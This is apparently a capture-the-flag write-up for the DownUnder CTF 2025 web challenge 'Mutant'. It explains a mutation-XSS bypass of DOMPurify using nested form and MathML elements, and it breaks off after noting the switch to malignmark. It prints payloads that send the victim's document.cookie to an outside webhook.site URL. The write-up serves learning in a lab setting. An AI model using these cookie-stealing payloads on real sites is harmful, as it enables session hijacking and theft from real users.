+++
title = 'DownUnder CTF 2025: Mutant'
date = 2025-07-23T20:06:37+03:00
draft = false
showpage = true
+++

----
Github Repo with official writeups: [DownUnderCTF 2025](https://github.com/DownUnderCTF/Challenges_2025_Public/tree/main/web/mutant)

----
### Description
Just an XSS. What more is there to it?

Category: web <br>
Difficulty: easy <br>
Author: ssparrow <br>

----

Open the web app through the browser. We can see this is like a XSS tester.

![alt](lab1.png)

According to the hint provided in the page, the flag is located at `document.cookie`. Even if we were able to find an XSS payload that executes `alert('document.cookie')` we would get our cookies, meaning that we would have an self-XSS.

In order to escalate this vulnerability and get the administrator's cookie we will leverage the report page utility. Specifically, we can use something like this.

```js
<img src=1 onerror="location.href='https://webhook.site/<id>/?c=' + document.cookie">
```

Now the administrator by opening the report will automatically execute a `GET` request to our webhook, along with the `document.cookie` parameter, which contains the flag.

Next step is to bypass the sanitization.
The title of the challenge is `mutant`, so maybe it probably has to do with `Mutation XSS`. By searching, a couple of sources seems interesting.

- [Mutation XSS via Mathml - DOMPurify 2.0.17 bypass](https://research.securitum.com/mutation-xss-via-mathml-mutation-dompurify-2-0-17-bypass/)
- [Bypassing DOMPurify again with mutation XSS](https://portswigger.net/research/bypassing-dompurify-again-with-mutation-xss)

Important things to keep from these are:<br>
1. The typical usage of DOMPurify makes the HTML markup to be parsed twice.
2. HTML specification has a quirk, making it possible to create nested `<form>` elements. However, on reparsing, the second `<form>` will be gone.
3. `mglyph` and `malignmark` are special elements in the HTML spec in a way that they are in MathML namespace if they are a direct child of MathML text integration point even though all other tags are in HTML namespace by default.
4. Using all of the above, we can create a markup that has two `<form>` elements and `mglyph` element that is initially in HTML namespace, but on reparsing it is in MathML namespace, making the subsequent style tag to be parsed differently and leading to XSS.

```txt
<form><math><mtext></form><form><mglyph><style></math><img src=1 onerror="location.href='https://webhook.site/3c4bd2f7-ceb6-411d-a465-f97ebac6d1c0/?c=' + document.cookie">     
```

Compiles to this.

```html
<html form>
  <math math>
    <math mtext>
      <math mglyph>
        <math style>
  <math math>
<html img src=1 onerror="location.href='https://webhook.site/3c4bd2f7-ceb6-411d-a465-f97ebac6d1c0/?c=' + document.cookie"
```

The `<form>` tag is gone and the `<style>` which was on HTML namespace is now on MathML namespace. Then `<mglyph>` under `<mtext>` is now on mathspace and therefore identifies `<style>` as tag and not as text.

The problem is that any tag with length 6 or 8 characters is removed. `<mglyph>` has 6 characters, so we need to use the other tag that is an exception to the HTML rules, `<malignmark>`

![alt](lab2.png)
